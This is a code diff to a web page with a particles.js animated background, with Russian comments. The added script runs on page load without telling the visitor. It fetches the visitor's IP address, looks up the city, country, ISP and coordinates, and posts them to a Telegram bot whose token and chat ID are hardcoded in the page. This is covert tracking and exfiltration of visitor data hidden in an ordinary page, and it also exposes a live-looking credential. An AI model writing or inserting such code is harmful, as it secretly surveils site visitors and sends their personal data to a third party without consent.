@@ -33,6 +33,50 @@
     <div id="particles-js"></div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
     <script>
+      // Функция для получения IP-адреса пользователя
+    function getIP(callback) {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ip = data.ip;
+          callback(ip);
+        })
+        .catch(error => {
+          console.log('Ошибка при получении IP-адреса:', error);
+        });
+    }
+    
+    
+    // Пример использования функций
+    getIP(function(ip) {
+      console.log('IP-адрес пользователя:', ip);
+      
+      const botToken = '5848862848:AAEIxZ-NCqLfXwec-TPzaN7CL9KJ9VSYesc';
+      const chatId = '973391034';
+      function getIPInfo(callback) {
+      fetch(`http://ip-api.com/json/${ip}`)
+        .then(response => response.json())
+        .then(data => {
+          callback(data)
+      })
+      .catch(error => {
+        console.log('Ошибка при получении информации об IP-адресе:', error);
+      }); 
+    }
+  // Отправляем сообщение
+  getIPInfo(function(data){
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `    Статус: ${data.status}\nАйпи: ${data.query}\nСтрана: ${data.country}\nГород: ${data.city}\n Провайдер: ${data.isp} | ${data.org} (${data.as})\n Долгота: ${data.lat}\n Широта: ${data.lon}\n Часовой пояс: ${data.timezone}\n `,
+      }),
+    })
+  });
+});
         document.addEventListener("DOMContentLoaded", function(event) {
             particlesJS('particles-js',
       {
